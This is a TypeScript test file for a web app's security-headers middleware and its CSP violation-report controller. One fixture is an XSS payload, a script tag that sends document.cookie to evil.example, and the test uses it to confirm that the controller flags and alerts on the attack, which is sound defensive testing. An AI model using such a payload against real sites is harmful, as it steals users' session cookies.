import { describe, it, expect, vi } from 'vitest';
import {
  SecurityHeadersMiddleware,
  type SecurityHeadersResponse,
} from '../../../backend/src/common/middleware/security-headers.middleware';
import {
  SecurityReportsController,
  type DiscordAlertDispatcher,
} from '../../../backend/src/modules/admin/security-reports.controller';

function createMockResponse(): {
  res: SecurityHeadersResponse;
  headers: Record<string, string>;
} {
  const headers: Record<string, string> = {};
  const res: SecurityHeadersResponse = {
    locals: {},
    setHeader(name: string, value: string) {
      headers[name.toLowerCase()] = value;
    },
  };
  return { res, headers };
}

describe('SecurityHeadersMiddleware & SecurityReportsController (#392)', () => {
  it('generates distinct per-request nonces and emits strict CSP and anti-clickjacking headers', () => {
    const middleware = new SecurityHeadersMiddleware();
    const first = createMockResponse();
    const second = createMockResponse();
    const next = vi.fn();

    const nonce1 = middleware.use({}, first.res, next);
    const nonce2 = middleware.use({}, second.res, next);

    expect(nonce1).not.toBe(nonce2);
    expect(first.headers['content-security-policy']).toContain("default-src 'self'");
    expect(first.headers['content-security-policy']).toContain(`script-src 'self' 'nonce-${nonce1}'`);
    expect(first.headers['content-security-policy']).toContain("style-src 'self' 'unsafe-inline'");
    expect(first.headers['content-security-policy']).toContain("object-src 'none'");
    expect(first.headers['content-security-policy']).toContain("frame-ancestors 'none'");
    expect(first.headers['content-security-policy']).toContain('report-uri /api/v1/security/csp-reports');
    expect(first.headers['x-frame-options']).toBe('DENY');
    expect(next).toHaveBeenCalledTimes(2);
  });

  it('parses CSP violation reports, detects XSS probing patterns, and alerts DevOps on Discord for critical violations', async () => {
    const notifier: DiscordAlertDispatcher = {
      sendDiscordAlert: vi.fn().mockResolvedValue(undefined),
    };
    const controller = new SecurityReportsController(notifier);

    const parsed = await controller.ingestCspReport({
      'csp-report': {
        'document-uri': 'https://codepulse.dev/battle/42',
        'violated-directive': 'script-src',
        'blocked-uri': 'inline',
        'script-sample': '<script>fetch("https://evil.example?c=" + document.cookie)</script>',
      },
    });

    expect(parsed.xssProbingDetected).toBe(true);
    expect(parsed.xssPatternsMatched).toContain('script-tag');
    expect(parsed.xssPatternsMatched).toContain('cookie-exfiltration');
    expect(parsed.severity).toBe('critical');
    expect(parsed.discordAlertSent).toBe(true);
    expect(notifier.sendDiscordAlert).toHaveBeenCalledTimes(1);
    expect(controller.listCspReports()).toHaveLength(1);
  });
});
